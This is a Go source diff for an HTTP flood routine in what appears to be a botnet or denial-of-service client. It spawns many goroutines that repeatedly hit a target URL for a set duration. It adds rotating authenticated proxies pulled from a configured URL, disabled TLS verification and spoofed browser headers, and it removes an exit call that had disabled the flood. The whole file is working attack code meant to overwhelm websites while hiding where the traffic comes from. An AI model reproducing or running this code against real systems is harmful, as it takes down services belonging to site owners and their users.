@@ -1,18 +1,29 @@
 package methods
 
 import (
+	"crypto/tls"
+	"encoding/base64"
 	"fmt"
 	"homo/client/balancer"
+	"homo/client/config"
 	"homo/client/utils"
+	"io"
+	"math/rand"
 	"net/http"
 	"net/url"
-	"os"
 	"strconv"
 	"strings"
 	"time"
 )
 
-func HttpsDefault(target string, port string, duration string) {
+func HttpsDefault(target string, port string, duration string, useproxy string) {
+
+	defer func() { // try catch
+		if er := recover(); er != nil {
+			fmt.Print(er)
+			return
+		}
+	}()
 
 	duration = strings.ReplaceAll(duration, "\x00", "")
 	duration = strings.ReplaceAll(duration, "\x03", "")
@@ -24,18 +35,25 @@ func HttpsDefault(target string, port string, duration string) {
 		fmt.Println(err)
 	}
 	sec := time.Now().Unix()
-	os.Exit(0)
 	for time.Now().Unix() <= sec+int64(dur)-1 {
-		go httpattack(target)
-		go httpattack(target)
-		go httpattack(target)
 
+		for i := 0; i <= 4; i++ {
+			go httpattack(target, useproxy)
+		}
 		time.Sleep(100 * time.Millisecond)
 
 	}
 }
 
-func httpattack(target string) {
+func httpattack(target, useproxy string) {
+	defer func() { // try catch
+		if er := recover(); er != nil {
+			fmt.Print(er)
+			return
+		}
+	}()
+
+	client, req := newreq(target, useproxy)
 	for i := 0; i < 30; i++ {
 		select {
 		case <-balancer.BalanceCh:
@@ -44,68 +62,105 @@ func httpattack(target string) {
 		default:
 			fmt.Println(i)
 			fmt.Println(target)
-			http.Get(target)
-			http.PostForm(target, url.Values{"login": {utils.RandomString(5)}, "password": {utils.RandomString(5)}, "captcha": {utils.RandomString(5)}})
+			client.Do(req)
+			_, err := client.Do(req)
+
+			if err != nil {
+				fmt.Println(err)
+			}
 			time.Sleep(10 * time.Millisecond)
 		}
 	}
 }
 
-// func getreq(target string) {
+func newreq(target string, useproxy string) (*http.Client, *http.Request) {
 
-// 	tlsconf := &tls.Config{
-// 		CipherSuites: []uint16{
-// 			tls.TLS_AES_256_GCM_SHA384,
-// 			tls.TLS_RSA_WITH_RC4_128_SHA,
-// 			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
-// 			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
-// 			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
-// 			tls.TLS_RSA_WITH_AES_128_CBC_SHA256,
-// 			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
-// 			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
-// 			tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,
-// 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
-// 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
-// 			tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA,
-// 			tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,
-// 			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-// 			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-// 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,
-// 			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,
-// 			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-// 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-// 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-// 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-// 			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-// 			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-// 			tls.TLS_AES_128_GCM_SHA256,
-// 			tls.TLS_AES_256_GCM_SHA384,
-// 			tls.TLS_CHACHA20_POLY1305_SHA256,
-// 			tls.TLS_FALLBACK_SCSV,
-// 			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
-// 			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
-// 			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-// 		},
-// 	}
+	defer func() { // try catch
+		if er := recover(); er != nil {
+			fmt.Print(er)
+			return
+		}
+	}()
 
-// 	tr := &http.Transport{
-// 		TLSClientConfig: tlsconf,
-// 	}
-// 	client := &http.Client{Transport: tr}
+	var client *http.Client
 
-// 	rand.Seed(time.Now().UTC().UnixNano())
-// 	req, _ := http.NewRequest("GET", target, nil)
+	req, _ := http.NewRequest("GET", target, nil)
+	if useproxy == "true" {
 
-// 	req.Header.Add("User-Agent", utils.GetUserAgent())
-// 	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
-// 	req.Header.Add("Accept-Encoding", "gzip, deflate, br")
-// 	req.Header.Add("Accept-Language", "en-US,en;q=0.5")
-// 	req.Header.Add("Connection", "keep-alive")
-// 	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
-// 	resp, err := client.Do(req)
-// 	if err != nil {
-// 		fmt.Println(err)
-// 		return
-// 	}
-// 	defer resp.Body.Close()
-// }
+		proxy := getProxy()
+
+		var proxyURL url.URL
+
+		if len(proxy) > 2 { // proxy with auth
+			proxyURL = url.URL{
+				Scheme: "http",
+				Host:   proxy[2] + ":" + proxy[3]}
+
+			auth := fmt.Sprintf("%s:%s", proxy[0], proxy[1])
+			basic := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
+			req.Header.Add("Proxy-Authorization", basic)
+		} else {
+			proxyURL = url.URL{
+				Scheme: "http",
+				Host:   proxy[0] + ":" + proxy[1]}
+		}
+
+		transport := &http.Transport{
+			Proxy:           http.ProxyURL(&proxyURL),
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		transport.ProxyConnectHeader = req.Header
+
+		client = &http.Client{Transport: transport}
+
+	} else {
+		req.Header.Add("User-Agent", utils.GetUserAgent())
+		req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+		req.Header.Add("Accept-Encoding", "gzip, deflate, br")
+		req.Header.Add("Accept-Language", "en-US,en;q=0.5")
+		req.Header.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
+		client = &http.Client{}
+	}
+	return client, req
+}
+
+func getProxy() []string {
+
+_GETPROXY:
+	_proxies, err := http.Get(config.PROXYURL)
+
+	if err != nil {
+		fmt.Println(err)
+		goto _GETPROXY
+	}
+
+	proxies, err := io.ReadAll(_proxies.Body)
+
+	if err != nil {
+		fmt.Println(err)
+		goto _GETPROXY
+	}
+
+	var strs []string
+
+	for _, i := range strings.Split(string(proxies), "\n") {
+
+		if len(i) < 2 {
+			continue
+		}
+
+		strs = append(strs, i)
+	}
+
+	cStrs := len(strs)
+
+	s1 := rand.NewSource(time.Now().UnixNano())
+	r1 := rand.New(s1)
+
+	d := strs[r1.Intn(cStrs)]
+
+	proxy := strings.Split(d, ":")
+
+	return proxy
+
+}
